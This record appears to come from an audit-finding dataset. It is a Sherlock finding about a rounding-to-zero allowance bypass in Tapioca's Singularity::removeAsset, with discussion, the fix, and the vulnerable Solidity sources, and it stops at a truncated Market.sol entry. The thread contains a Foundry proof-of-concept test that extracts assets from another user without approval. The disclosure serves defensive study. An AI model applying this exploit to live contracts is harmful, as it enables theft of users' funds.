{
  "Title": "M-4: Singularity::removeAsset share can become zero due to rounding down, and any user can be extracted some amount of asset",
  "Content": "# Issue M-4: Singularity::removeAsset share can become zero due to rounding down, and any user can be extracted some amount of asset \n\nSource: https://github.com/sherlock-audit/2024-02-tapioca-judging/issues/39 \n\n## Found by \ncergyk\n## Summary\nAn attacker can use rounding down of the share of asset to zero, to remove small amounts of asset from any user, since the allowance needed in that case is zero.\n\n## Vulnerability Detail\nWe can see that when `Singularity::removeAsset` is called, the [allowance is checked](https://github.com/sherlock-audit/2024-02-tapioca/blob/main/Tapioca-bar/contracts/markets/singularity/Singularity.sol#L252)\n\nBut if `share == 0` this check will always succeed. Since share is computed with a [rounding down](https://github.com/sherlock-audit/2024-02-tapioca/blob/main/Tapioca-bar/contracts/markets/singularity/SGLCommon.sol#L205)\n\nIt can be rounded down to zero, and any user can steal some amount of asset from any other user.\n\nIt seems that the amount should be small, but as yieldBox shares become more expensive than borrow shares for the market, the value `yieldBox.toShare(assetId, totalBorrow.elastic, false)` can be significantly reduced, thus inducing a greater rounding down.\n\n## Impact\nAny user can steal some amount of asset from any other user\n\n## Code Snippet\n\n## Tool used\n\nManual Review\n\n## Recommendation\nProtect this call with a `require(share != 0)` as is done in all other calls requiring allowance:\nhttps://github.com/sherlock-audit/2024-02-tapioca/blob/main/Tapioca-bar/contracts/markets/singularity/SGLBorrow.sol#L41\n\n\n\n## Discussion\n\n**nevillehuang**\n\nrequest poc\n\n**sherlock-admin3**\n\nPoC requested from @CergyK\n\nRequests remaining: **7**\n\n**cryptotechmaker**\n\nThe check is actually already done here https://github.com/Tapioca-DAO/Tapioca-bar/blob/master/contracts/markets/Market.sol#L421 and here https://github.com/Tapioca-DAO/Tapioca-bar/blob/master/contracts/markets/Market.sol#L407\n\n**cryptotechmaker**\n\nAh this doesn't exist on the version you are reviewing so the issue is still valid\n\n\n**sherlock-admin4**\n\nThe protocol team fixed this issue in PR/commit https://github.com/Tapioca-DAO/Tapioca-bar/commit/41f9c4fbf175cc2f5412b47519ddd69be822bf58.\n\n**CergyK**\n\nHere's a test to add in `Usdo.t.sol`,\n\ndemonstrating how a user can extract some asset from another:\n\n```solidity\nfunction test_poc39() public {\n  address alice = address(1337);\n  address bob = address(1338);\n  address charlie = address(1339);\n\n  uint erc20Amount_ = 10e18;\n  //Setup victim account\n  {\n      vm.startPrank(alice);\n      deal(address(bUsdo), alice, erc20Amount_);\n      bUsdo.approve(address(yieldBox), type(uint256).max);\n      (,uint shares) = yieldBox.depositAsset(bUsdoYieldBoxId, alice, alice, erc20Amount_, 0);\n\n      yieldBox.setApprovalForAll(address(pearlmit), true);\n      pearlmit.approve(\n          address(yieldBox), bUsdoYieldBoxId, address(singularity), uint200(shares), uint48(block.timestamp + 1)\n      );\n      singularity.addAsset(alice, alice, false, shares);\n\n      vm.stopPrank();\n  }\n\n  //Setup conditions (have borrows to trigger yieldbox.toShare conversion)\n  {\n      uint collateralAmount = erc20Amount_*2;\n      vm.startPrank(charlie);\n      deal(address(aUsdo), charlie, collateralAmount);\n      aUsdo.approve(address(yieldBox), type(uint256).max);\n      (,uint shares) = yieldBox.depositAsset(aUsdoYieldBoxId, charlie, charlie, collateralAmount, 0);\n\n      yieldBox.setApprovalForAll(address(pearlmit), true);\n      pearlmit.approve(\n          address(yieldBox), aUsdoYieldBoxId, address(singularity), uint200(shares), uint48(block.timestamp + 1)\n      );\n\n      Module[] memory modules;\n      bytes[] memory calls;\n      (modules, calls) = marketHelper.addCollateral(charlie, charlie, false, 0, shares);\n      singularity.execute(modules, calls, true);\n\n      (modules, calls) = marketHelper.borrow(charlie, charlie, (erc20Amount_*9)/10);\n      singularity.execute(modules, calls, true);\n\n      vm.stopPrank();\n  }\n\n  //Simulate some yield has accrued in the strategy by donating some amount directly to strategy\n  uint YIELD_AMOUNT = 10*erc20Amount_;\n  deal(address(bUsdo), address(this), YIELD_AMOUNT);\n  bUsdo.transfer(address(bUsdoStrategy), YIELD_AMOUNT);\n\n  //Bob can extract some asset from Alice without approval\n  {\n      uint EXTRACT_AMOUNT = 5;\n      vm.startPrank(bob);\n      singularity.removeAsset(alice, bob, EXTRACT_AMOUNT);\n  }\n}\n```\n\n**cryptotechmaker**\n\nI'll add the test @CergyK . Thanks for the suggestion. However, after fixes, we need to add the following line before the last `removeAsset`\n\n`vm.expectRevert();`\n\n",
  "Impact": "MEDIUM",
  "Source": "https://app.sherlock.xyz/audits/contests/170",
  "Code": [
    {
      "filename": "Tapioca-bar/contracts/markets/singularity/Singularity.sol",
      "content": "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.22;\n\n// External\nimport {RebaseLibrary, Rebase} from \"@boringcrypto/boring-solidity/contracts/libraries/BoringRebase.sol\";\nimport {IERC20} from \"@boringcrypto/boring-solidity/contracts/libraries/BoringERC20.sol\";\nimport {SafeCast} from \"@openzeppelin/contracts/utils/math/SafeCast.sol\";\n\n// Tapioca\nimport {ILeverageExecutor} from \"tapioca-periph/interfaces/bar/ILeverageExecutor.sol\";\nimport {ITapiocaOracle} from \"tapioca-periph/interfaces/periph/ITapiocaOracle.sol\";\nimport {IYieldBox} from \"tapioca-periph/interfaces/yieldbox/IYieldBox.sol\";\nimport {IPearlmit} from \"tapioca-periph/interfaces/periph/IPearlmit.sol\";\nimport {IPenrose} from \"tapioca-periph/interfaces/bar/IPenrose.sol\";\nimport {Module} from \"tapioca-periph/interfaces/bar/IMarket.sol\";\nimport {SGLLiquidation} from \"./SGLLiquidation.sol\";\nimport {SGLCollateral} from \"./SGLCollateral.sol\";\nimport {SGLLeverage} from \"./SGLLeverage.sol\";\nimport {SGLCommon} from \"./SGLCommon.sol\";\nimport {SGLBorrow} from \"./SGLBorrow.sol\";\n\n// solhint-disable max-line-length\n\n/*\n\n████████╗ █████╗ ██████╗ ██╗ ██████╗  ██████╗ █████╗ \n╚══██╔══╝██╔══██╗██╔══██╗██║██╔═══██╗██╔════╝██╔══██╗\n   ██║   ███████║██████╔╝██║██║   ██║██║     ███████║\n   ██║   ██╔══██║██╔═══╝ ██║██║   ██║██║     ██╔══██║\n   ██║   ██║  ██║██║     ██║╚██████╔╝╚██████╗██║  ██║\n   ╚═╝   ╚═╝  ╚═╝╚═╝     ╚═╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝\n   \n*/\n\n/// @title Tapioca market\ncontract Singularity is SGLCommon {\n    using RebaseLibrary for Rebase;\n    using SafeCast for uint256;\n\n    // ************ //\n    // *** VARS *** //\n    // ************ //\n    /// @notice returns the liquidation module\n    SGLLiquidation public liquidationModule;\n    /// @notice returns the borrow module\n    SGLBorrow public borrowModule;\n    /// @notice returns the collateral module\n    SGLCollateral public collateralModule;\n    /// @notice returns the leverage module\n    SGLLeverage public leverageModule;\n\n    // ************** //\n    // *** ERRORS *** //\n    // ************** //\n    error BadPair();\n    error NotValid();\n    error ModuleNotSet();\n    error NotAuthorized();\n    error SameState();\n\n    struct _InitMemoryData {\n        IPenrose penrose_;\n        ITapiocaOracle _oracle;\n        uint256 _exchangeRatePrecision;\n        uint256 _collateralizationRate;\n        uint256 _liquidationCollateralizationRate;\n        ILeverageExecutor _leverageExecutor;\n    }\n\n    struct _InitMemoryModulesData {\n        address _liquidationModule;\n        address _borrowModule;\n        address _collateralModule;\n        address _leverageModule;\n    }\n\n    struct _InitMemoryTokensData {\n        IERC20 _asset;\n        uint256 _assetId;\n        IERC20 _collateral;\n        uint256 _collateralId;\n    }\n\n    /// @notice The init function that acts as a constructor\n    function init(bytes calldata initData) external onlyOnce {\n        (\n            _InitMemoryModulesData memory _initMemoryModulesData,\n            _InitMemoryTokensData memory _initMemoryTokensData,\n            _InitMemoryData memory _initMemoryData\n        ) = abi.decode(initData, (_InitMemoryModulesData, _InitMemoryTokensData, _InitMemoryData));\n\n        penrose = _initMemoryData.penrose_;\n        pearlmit = IPearlmit(_initMemoryData.penrose_.pearlmit());\n        yieldBox = IYieldBox(_initMemoryData.penrose_.yieldBox());\n        _transferOwnership(address(penrose));\n\n        if (address(_initMemoryTokensData._collateral) == address(0)) {\n            revert BadPair();\n        }\n        if (address(_initMemoryTokensData._asset) == address(0)) {\n            revert BadPair();\n        }\n        if (address(_initMemoryData._oracle) == address(0)) revert BadPair();\n\n        _initModules(\n            _initMemoryModulesData._liquidationModule,\n            _initMemoryModulesData._borrowModule,\n            _initMemoryModulesData._collateralModule,\n            _initMemoryModulesData._leverageModule\n        );\n        _initCoreStorage(\n            _initMemoryTokensData._asset,\n            _initMemoryTokensData._assetId,\n            _initMemoryTokensData._collateral,\n            _initMemoryTokensData._collateralId,\n            _initMemoryData._oracle,\n            _initMemoryData._leverageExecutor\n        );\n        _initDefaultValues(\n            _initMemoryData._collateralizationRate,\n            _initMemoryData._liquidationCollateralizationRate,\n            _initMemoryData._exchangeRatePrecision\n        );\n    }\n\n    function _initModules(\n        address _liquidationModule,\n        address _borrowModule,\n        address _collateralModule,\n        address _leverageModule\n    ) private {\n        if (_liquidationModule == address(0)) revert NotValid();\n        if (_collateralModule == address(0)) revert NotValid();\n        if (_borrowModule == address(0)) revert NotValid();\n        if (_leverageModule == address(0)) revert NotValid();\n        liquidationModule = SGLLiquidation(_liquidationModule);\n        collateralModule = SGLCollateral(_collateralModule);\n        borrowModule = SGLBorrow(_borrowModule);\n        leverageModule = SGLLeverage(_leverageModule);\n    }\n\n    function _initCoreStorage(\n        IERC20 _asset,\n        uint256 _assetId,\n        IERC20 _collateral,\n        uint256 _collateralId,\n        ITapiocaOracle _oracle,\n        ILeverageExecutor _leverageExecutor\n    ) private {\n        asset = _asset;\n        collateral = _collateral;\n        assetId = _assetId;\n        collateralId = _collateralId;\n        oracle = _oracle;\n        leverageExecutor = _leverageExecutor;\n    }\n\n    function _initDefaultValues(\n        uint256 _collateralizationRate,\n        uint256 _liquidationCollateralizationRate,\n        uint256 _exchangeRatePrecision\n    ) private {\n        collateralizationRate = _collateralizationRate > 0 ? _collateralizationRate : 75000;\n        liquidationCollateralizationRate =\n            _liquidationCollateralizationRate > 0 ? _liquidationCollateralizationRate : 80000;\n        require(\n            liquidationCollateralizationRate > collateralizationRate, \"SGL: liquidationCollateralizationRate not valid\"\n        );\n        minimumInterestPerSecond = 158548960; // approx 0.5% APR\n        maximumInterestPerSecond = 317097920000; // approx 1000% APR\n        interestElasticity = 28800e36; // Half or double in 28800 seconds (8 hours) if linear\n        startingInterestPerSecond = minimumInterestPerSecond;\n        accrueInfo.interestPerSecond = startingInterestPerSecond; // 1% APR, with 1e18 being 100%\n        updateExchangeRate();\n        //default fees\n        protocolFee = 10000; // 10%; used for accrual\n        borrowOpeningFee = 50; // 0.05%\n        //liquidation\n        liquidationMultiplier = 12000; //12%\n        lqCollateralizationRate = 25000;\n        EXCHANGE_RATE_PRECISION = _exchangeRatePrecision > 0 ? _exchangeRatePrecision : 1e18;\n        minLiquidatorReward = 8e4;\n        maxLiquidatorReward = 9e4;\n        liquidationBonusAmount = 1e4;\n        minimumTargetUtilization = 3e17;\n        maximumTargetUtilization = 5e17;\n        fullUtilizationMinusMax = FULL_UTILIZATION - maximumTargetUtilization;\n        rateValidDuration = 24 hours;\n\n        conservator = owner();\n    }\n\n    // ************************ //\n    // *** PUBLIC FUNCTIONS *** //\n    // ************************ //\n\n    /// @notice Allows batched call to Singularity.\n    /// @param calls An array encoded call data.\n    /// @param revertOnFail If True then reverts after a failed call and stops doing further calls.\n    /// @return successes count of successful operations\n    /// @return results array of revert messages\n    function execute(Module[] calldata modules, bytes[] calldata calls, bool revertOnFail)\n        external\n        nonReentrant\n        returns (bool[] memory successes, bytes[] memory results)\n    {\n        successes = new bool[](calls.length);\n        results = new bytes[](calls.length);\n        if (modules.length != calls.length) revert NotValid();\n        unchecked {\n            for (uint256 i; i < calls.length; i++) {\n                (bool success, bytes memory result) = _extractModule(modules[i]).delegatecall(calls[i]);\n\n                if (!success && revertOnFail) {\n                    revert(abi.decode(_getRevertMsg(result), (string)));\n                }\n                successes[i] = success;\n                results[i] = !success ? _getRevertMsg(result) : result;\n            }\n        }\n    }\n\n    /// @notice Adds assets to the lending pair.\n    /// @param from Address to add asset from.\n    /// @param to The address of the user to receive the assets.\n    /// @param skim True if the amount should be skimmed from the deposit balance of msg.sender.\n    /// False if tokens from msg.sender in `yieldBox` should be transferred.\n    /// @param share The amount of shares to add.\n    /// @return fraction Total fractions added.\n    function addAsset(address from, address to, bool skim, uint256 share)\n        external\n        optionNotPaused(PauseType.AddAsset)\n        allowedLend(from, share)\n        returns (uint256 fraction)\n    {\n        _accrue();\n        fraction = _addAsset(from, to, skim, share);\n    }\n\n    /// @notice Removes an asset from `from` and transfers it to `to`.\n    /// @param from Account to debit assets from.\n    /// @param to The user that receives the removed assets.\n    /// @param fraction The amount/fraction of assets held to remove.\n    /// @return share The amount of shares transferred to `to`.\n    function removeAsset(address from, address to, uint256 fraction)\n        external\n        optionNotPaused(PauseType.RemoveAsset)\n        returns (uint256 share)\n    {\n        _accrue();\n        share = _removeAsset(from, to, fraction);\n        _allowedLend(from, share);\n    }\n\n    // *********************** //\n    // *** OWNER FUNCTIONS *** //\n    // *********************** //\n    /// @notice updates the pause state of the contract\n    /// @dev can only be called by the conservator\n    /// @param val the new value\n    function updatePause(PauseType _type, bool val, bool resetAccrueTimestmap) external {\n        if (msg.sender != conservator) revert NotAuthorized();\n        if (val == pauseOptions[_type]) revert SameState();\n        emit PausedUpdated(_type, pauseOptions[_type], val);\n        pauseOptions[_type] = val;\n\n        // In case of 'unpause', `lastAccrued` is set to block.timestamp\n        // Valid for all action types that has an impact on debt or supply\n        if (!val && (_type != PauseType.AddCollateral && _type != PauseType.RemoveCollateral)) {\n            accrueInfo.lastAccrued = resetAccrueTimestmap ? block.timestamp.toUint64() : accrueInfo.lastAccrued;\n        }\n    }\n\n    /// @notice rescues unused ETH from the contract\n    /// @param amount the amount to rescue\n    /// @param to the recipient\n    function rescueEth(uint256 amount, address to) external onlyOwner {\n        (bool success,) = to.call{value: amount}(\"\");\n        if (!success) revert TransferFailed();\n    }\n\n    /// @notice Transfers fees to penrose\n    /// @dev can only be called by the owner\n    /// @return feeShares the amount of fees in shares withdrawn under Penrose\n    function refreshPenroseFees() external onlyOwner returns (uint256 feeShares) {\n        address _feeTo = address(penrose);\n        // withdraw the fees accumulated in `accrueInfo.feesEarnedFraction` to the balance of `feeTo`.\n        if (accrueInfo.feesEarnedFraction > 0) {\n            _accrue();\n            uint256 _feesEarnedFraction = accrueInfo.feesEarnedFraction;\n            balanceOf[_feeTo] += _feesEarnedFraction;\n            emit Transfer(address(0), _feeTo, _feesEarnedFraction);\n            accrueInfo.feesEarnedFraction = 0;\n            emit LogWithdrawFees(_feeTo, _feesEarnedFraction);\n        }\n\n        feeShares = _removeAsset(_feeTo, msg.sender, balanceOf[_feeTo]);\n    }\n\n    /// @notice sets Singularity specific configuration\n    /// @dev values are updated only if > 0 or not address(0)\n    ///     - borrowOpeningFee is always updated!\n    function setSingularityConfig(\n        uint256 _borrowOpeningFee,\n        uint256 _lqCollateralizationRate,\n        uint256 _liquidationMultiplier,\n        uint256 _minimumTargetUtilization,\n        uint256 _maximumTargetUtilization,\n        uint64 _minimumInterestPerSecond,\n        uint64 _maximumInterestPerSecond,\n        uint256 _interestElasticity\n    ) external onlyOwner {\n        _accrue();\n\n        if (_borrowOpeningFee > FEE_PRECISION) revert NotValid();\n        emit LogBorrowingFee(borrowOpeningFee, _borrowOpeningFee);\n        borrowOpeningFee = _borrowOpeningFee;\n\n        if (_minimumTargetUtilization > 0) {\n            emit MinimumTargetUtilizationUpdated(minimumTargetUtilization, _minimumTargetUtilization);\n            minimumTargetUtilization = _minimumTargetUtilization;\n        }\n\n        if (_maximumTargetUtilization > 0) {\n            if (_maximumTargetUtilization >= FULL_UTILIZATION) {\n                revert NotValid();\n            }\n\n            emit MaximumTargetUtilizationUpdated(maximumTargetUtilization, _maximumTargetUtilization);\n            maximumTargetUtilization = _maximumTargetUtilization;\n            fullUtilizationMinusMax = FULL_UTILIZATION - maximumTargetUtilization;\n        }\n\n        if (_minimumInterestPerSecond > 0) {\n            if (_minimumInterestPerSecond >= maximumInterestPerSecond) {\n                revert NotValid();\n            }\n            emit MinimumInterestPerSecondUpdated(minimumInterestPerSecond, _minimumInterestPerSecond);\n            minimumInterestPerSecond = _minimumInterestPerSecond;\n        }\n\n        if (_maximumInterestPerSecond > 0) {\n            if (_maximumInterestPerSecond <= minimumInterestPerSecond) {\n                revert NotValid();\n            }\n            emit MaximumInterestPerSecondUpdated(maximumInterestPerSecond, _maximumInterestPerSecond);\n            maximumInterestPerSecond = _maximumInterestPerSecond;\n        }\n\n        if (_interestElasticity > 0) {\n            emit InterestElasticityUpdated(interestElasticity, _interestElasticity);\n            interestElasticity = _interestElasticity;\n        }\n\n        if (_lqCollateralizationRate > 0) {\n            if (_lqCollateralizationRate > FEE_PRECISION) revert NotValid();\n            emit LqCollateralizationRateUpdated(lqCollateralizationRate, _lqCollateralizationRate);\n            lqCollateralizationRate = _lqCollateralizationRate;\n        }\n\n        if (_liquidationMultiplier > 0) {\n            if (_liquidationMultiplier > FEE_PRECISION) revert NotValid();\n            emit LiquidationMultiplierUpdated(liquidationMultiplier, _liquidationMultiplier);\n            liquidationMultiplier = _liquidationMultiplier;\n        }\n    }\n\n    // ************************* //\n    // *** PRIVATE FUNCTIONS *** //\n    // ************************* //\n    function _extractModule(Module _module) private view returns (address) {\n        address module;\n        if (_module == Module.Base) {\n            return address(this);\n        } else if (_module == Module.Borrow) {\n            module = address(borrowModule);\n        } else if (_module == Module.Collateral) {\n            module = address(collateralModule);\n        } else if (_module == Module.Liquidation) {\n            module = address(liquidationModule);\n        } else if (_module == Module.Leverage) {\n            module = address(leverageModule);\n        }\n        if (module == address(0)) revert ModuleNotSet();\n\n        return module;\n    }\n\n    receive() external payable {}\n}"
    },
    {
      "filename": "Tapioca-bar/contracts/markets/singularity/SGLCommon.sol",
      "content": "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.22;\n\n// External\nimport {RebaseLibrary, Rebase} from \"@boringcrypto/boring-solidity/contracts/libraries/BoringRebase.sol\";\nimport {ISingularity, IMarket} from \"tapioca-periph/interfaces/bar/ISingularity.sol\";\nimport {SafeCast} from \"@openzeppelin/contracts/utils/math/SafeCast.sol\";\n\n// Tapioca\nimport {IYieldBox} from \"tapioca-periph/interfaces/yieldbox/IYieldBox.sol\";\nimport {ICluster} from \"tapioca-periph/interfaces/periph/ICluster.sol\";\nimport {SGLStorage} from \"./SGLStorage.sol\";\n\n/*\n\n████████╗ █████╗ ██████╗ ██╗ ██████╗  ██████╗ █████╗ \n╚══██╔══╝██╔══██╗██╔══██╗██║██╔═══██╗██╔════╝██╔══██╗\n   ██║   ███████║██████╔╝██║██║   ██║██║     ███████║\n   ██║   ██╔══██║██╔═══╝ ██║██║   ██║██║     ██╔══██║\n   ██║   ██║  ██║██║     ██║╚██████╔╝╚██████╗██║  ██║\n   ╚═╝   ╚═╝  ╚═╝╚═╝     ╚═╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝\n   \n*/\n\ncontract SGLCommon is SGLStorage {\n    using RebaseLibrary for Rebase;\n    using SafeCast for uint256;\n\n    // ************** //\n    // *** ERRORS *** //\n    // ************** //\n    error TooMuch();\n    error MinLimit();\n    error TransferFailed();\n\n    // ************************ //\n    // *** PUBLIC FUNCTIONS *** //\n    // ************************ //\n    /// @notice Accrues the interest on the borrowed tokens and handles the accumulation of fees.\n    function accrue() external {\n        _accrue();\n    }\n\n    function getInterestDetails()\n        external\n        view\n        returns (ISingularity.AccrueInfo memory _accrueInfo, uint256 utilization)\n    {\n        (_accrueInfo,,,,, utilization,) = _getInterestRate();\n    }\n\n    // ************************** //\n    // *** PRIVATE FUNCTIONS *** //\n    // ************************* //\n    function _getInterestRate()\n        internal\n        view\n        returns (\n            ISingularity.AccrueInfo memory _accrueInfo,\n            Rebase memory _totalBorrow,\n            Rebase memory _totalAsset,\n            uint256 extraAmount,\n            uint256 feeFraction,\n            uint256 utilization,\n            bool logStartingInterest\n        )\n    {\n        _accrueInfo = accrueInfo;\n        _totalBorrow = totalBorrow;\n        _totalAsset = totalAsset;\n        extraAmount = 0;\n        feeFraction = 0;\n        logStartingInterest = false;\n\n        uint256 fullAssetAmount = yieldBox.toAmount(assetId, _totalAsset.elastic, false) + _totalBorrow.elastic;\n\n        utilization =\n            fullAssetAmount == 0 ? 0 : (uint256(_totalBorrow.elastic) * UTILIZATION_PRECISION) / fullAssetAmount;\n\n        // Number of seconds since accrue was called\n        uint256 elapsedTime = block.timestamp - _accrueInfo.lastAccrued;\n        if (elapsedTime == 0) {\n            return (_accrueInfo, totalBorrow, totalAsset, 0, 0, utilization, logStartingInterest);\n        }\n        _accrueInfo.lastAccrued = block.timestamp.toUint64();\n\n        if (_totalBorrow.base == 0) {\n            // If there are no borrows, reset the interest rate\n            if (_accrueInfo.interestPerSecond != startingInterestPerSecond) {\n                _accrueInfo.interestPerSecond = startingInterestPerSecond;\n                logStartingInterest = true;\n            }\n            return (_accrueInfo, _totalBorrow, totalAsset, 0, 0, utilization, logStartingInterest);\n        }\n\n        // Accrue interest\n        extraAmount = (uint256(_totalBorrow.elastic) * _accrueInfo.interestPerSecond * elapsedTime) / 1e18;\n        _totalBorrow.elastic += extraAmount.toUint128();\n\n        //take accrued values into account\n        fullAssetAmount = yieldBox.toAmount(assetId, _totalAsset.elastic, false) + _totalBorrow.elastic;\n\n        uint256 feeAmount = (extraAmount * protocolFee) / FEE_PRECISION; // % of interest paid goes to fee\n        feeFraction = (feeAmount * _totalAsset.base) / (fullAssetAmount - feeAmount);\n        _accrueInfo.feesEarnedFraction += feeFraction.toUint128();\n        _totalAsset.base = _totalAsset.base + feeFraction.toUint128();\n\n        utilization =\n            fullAssetAmount == 0 ? 0 : (uint256(_totalBorrow.elastic) * UTILIZATION_PRECISION) / fullAssetAmount;\n\n        // Update interest rate\n        if (utilization < minimumTargetUtilization) {\n            uint256 underFactor =\n                ((minimumTargetUtilization - utilization) * FACTOR_PRECISION) / minimumTargetUtilization;\n            uint256 scale = interestElasticity + (underFactor * underFactor * elapsedTime);\n            _accrueInfo.interestPerSecond =\n                ((uint256(_accrueInfo.interestPerSecond) * interestElasticity) / scale).toUint64();\n            if (_accrueInfo.interestPerSecond < minimumInterestPerSecond) {\n                _accrueInfo.interestPerSecond = minimumInterestPerSecond; // 0.25% APR minimum\n            }\n        } else if (utilization > maximumTargetUtilization) {\n            uint256 overFactor = ((utilization - maximumTargetUtilization) * FACTOR_PRECISION) / fullUtilizationMinusMax;\n            uint256 scale = interestElasticity + (overFactor * overFactor * elapsedTime);\n            uint256 newInterestPerSecond = (uint256(_accrueInfo.interestPerSecond) * scale) / interestElasticity;\n            if (newInterestPerSecond > maximumInterestPerSecond) {\n                newInterestPerSecond = maximumInterestPerSecond; // 1000% APR maximum\n            }\n            _accrueInfo.interestPerSecond = newInterestPerSecond.toUint64();\n        }\n    }\n\n    function _accrueView() internal view override returns (Rebase memory _totalBorrow) {\n        (, _totalBorrow,,,,,) = _getInterestRate();\n    }\n\n    function _accrue() internal override {\n        (\n            ISingularity.AccrueInfo memory _accrueInfo,\n            Rebase memory _totalBorrow,\n            Rebase memory _totalAsset,\n            uint256 extraAmount,\n            uint256 feeFraction,\n            uint256 utilization,\n            bool logStartingInterest\n        ) = _getInterestRate();\n\n        if (logStartingInterest) {\n            emit LogAccrue(0, 0, startingInterestPerSecond, 0);\n        } else {\n            emit LogAccrue(extraAmount, feeFraction, _accrueInfo.interestPerSecond, utilization);\n        }\n        accrueInfo = _accrueInfo;\n        totalBorrow = _totalBorrow;\n        totalAsset = _totalAsset;\n    }\n\n    /// @dev Helper function to move tokens.\n    /// @param from Account to debit tokens from, in `yieldBox`.\n    /// @param _assetId The ERC-20 token asset ID in yieldBox.\n    /// @param share The amount in shares to add.\n    /// @param total Grand total amount to deduct from this contract's balance. Only applicable if `skim` is True.\n    /// Only used for accounting checks.\n    /// @param skim If True, only does a balance check on this contract.\n    /// False if tokens from msg.sender in `yieldBox` should be transferred.\n    function _addTokens(address from, address, uint256 _assetId, uint256 share, uint256 total, bool skim) internal {\n        if (skim) {\n            if (share > yieldBox.balanceOf(address(this), _assetId) - total) {\n                revert TooMuch();\n            }\n        } else {\n            // yieldBox.transfer(from, address(this), _assetId, share);\n            bool isErr = pearlmit.transferFromERC1155(from, address(this), address(yieldBox), _assetId, share);\n            if (isErr) {\n                revert TransferFailed();\n            }\n        }\n    }\n\n    /// @dev Concrete implementation of `addAsset`.\n    function _addAsset(address from, address to, bool skim, uint256 share) internal returns (uint256 fraction) {\n        Rebase memory _totalAsset = totalAsset;\n        uint256 totalAssetShare = _totalAsset.elastic;\n        uint256 allShare = _totalAsset.elastic + yieldBox.toShare(assetId, totalBorrow.elastic, true);\n        fraction = allShare == 0 ? share : (share * _totalAsset.base) / allShare;\n        if (_totalAsset.base + fraction.toUint128() < 1000) {\n            return 0;\n        }\n        totalAsset = _totalAsset.add(share, fraction);\n\n        balanceOf[to] += fraction;\n        emit Transfer(address(0), to, fraction);\n\n        _addTokens(from, to, assetId, share, totalAssetShare, skim);\n        emit LogAddAsset(skim ? address(yieldBox) : from, to, share, fraction);\n    }\n\n    /// @dev Concrete implementation of `removeAsset`.\n    /// @param from The account to remove from. Should always be msg.sender except for `depositFeesToyieldBox()`.\n    function _removeAsset(address from, address to, uint256 fraction) internal returns (uint256 share) {\n        if (totalAsset.base == 0) {\n            return 0;\n        }\n        Rebase memory _totalAsset = totalAsset;\n        uint256 allShare = _totalAsset.elastic + yieldBox.toShare(assetId, totalBorrow.elastic, false);\n        share = (fraction * allShare) / _totalAsset.base;\n\n        _totalAsset.base -= fraction.toUint128();\n        if (_totalAsset.base < 1000) revert MinLimit();\n\n        balanceOf[from] -= fraction;\n        emit Transfer(from, address(0), fraction);\n        _totalAsset.elastic -= share.toUint128();\n        totalAsset = _totalAsset;\n        emit LogRemoveAsset(from, to, share, fraction);\n        yieldBox.transfer(address(this), to, assetId, share);\n    }\n\n    /// @dev Return the equivalent of collateral borrow part in asset amount.\n    function _getAmountForBorrowPart(uint256 borrowPart) internal view returns (uint256) {\n        return totalBorrow.toElastic(borrowPart, false);\n    }\n\n    function _isWhitelisted(uint16 _chainId, address _contract) internal view returns (bool) {\n        return ICluster(penrose.cluster()).isWhitelisted(_chainId, _contract);\n    }\n\n    struct _ViewLiquidationStruct {\n        address user;\n        uint256 maxBorrowPart;\n        uint256 minLiquidationBonus;\n        uint256 exchangeRate;\n        IYieldBox yieldBox;\n        uint256 collateralId;\n        uint256 userCollateralShare;\n        uint256 userBorrowPart;\n        Rebase totalBorrow;\n        uint256 liquidationBonusAmount;\n        uint256 liquidationCollateralizationRate;\n        uint256 liquidationMultiplier;\n        uint256 exchangeRatePrecision;\n        uint256 feeDecimalsPrecision;\n    }\n}"
    },
    {
      "filename": "Tapioca-bar/contracts/markets/singularity/SGLBorrow.sol",
      "content": "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.22;\n\nimport \"./SGLLendingCommon.sol\";\n\n/*\n\n████████╗ █████╗ ██████╗ ██╗ ██████╗  ██████╗ █████╗ \n╚══██╔══╝██╔══██╗██╔══██╗██║██╔═══██╗██╔════╝██╔══██╗\n   ██║   ███████║██████╔╝██║██║   ██║██║     ███████║\n   ██║   ██╔══██║██╔═══╝ ██║██║   ██║██║     ██╔══██║\n   ██║   ██║  ██║██║     ██║╚██████╔╝╚██████╗██║  ██║\n   ╚═╝   ╚═╝  ╚═╝╚═╝     ╚═╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝\n   \n*/\n\ncontract SGLBorrow is SGLLendingCommon {\n    using RebaseLibrary for Rebase;\n\n    // ************************ //\n    // *** PUBLIC FUNCTIONS *** //\n    // ************************ //\n    /// @notice Sender borrows `amount` and transfers it to `to`.\n    /// @param from Account to borrow for.\n    /// @param to The receiver of borrowed tokens.\n    /// @param amount Amount to borrow.\n    /// @return part Total part of the debt held by borrowers.\n    /// @return share Total amount in shares borrowed.\n    function borrow(address from, address to, uint256 amount)\n        external\n        optionNotPaused(PauseType.Borrow)\n        solvent(from, false)\n        notSelf(to)\n        returns (uint256 part, uint256 share)\n    {\n        if (amount == 0) return (0, 0);\n        uint256 feeAmount = (amount * borrowOpeningFee) / FEE_PRECISION;\n        uint256 allowanceShare =\n            _computeAllowanceAmountInAsset(from, exchangeRate, amount + feeAmount, _safeDecimals(asset));\n\n        if (allowanceShare == 0) revert AllowanceNotValid();\n\n        _allowedBorrow(from, allowanceShare);\n\n        (part, share) = _borrow(from, to, amount);\n    }\n\n    /// @notice Repays a loan.\n    /// @param from Address to repay from.\n    /// @param to Address of the user this payment should go.\n    /// @param skim True if the amount should be skimmed from the deposit balance of msg.sender.\n    /// False if tokens from msg.sender in `yieldBox` should be transferred.\n    /// @param part The amount to repay. See `userBorrowPart`.\n    /// @return amount The total amount repayed.\n    function repay(address from, address to, bool skim, uint256 part)\n        external\n        optionNotPaused(PauseType.Repay)\n        notSelf(to)\n        returns (uint256 amount)\n    {\n        updateExchangeRate();\n\n        _accrue();\n\n        amount = _repay(from, to, skim, part);\n    }\n}"
    },
    {
      "filename": "contracts/markets/Market.sol",
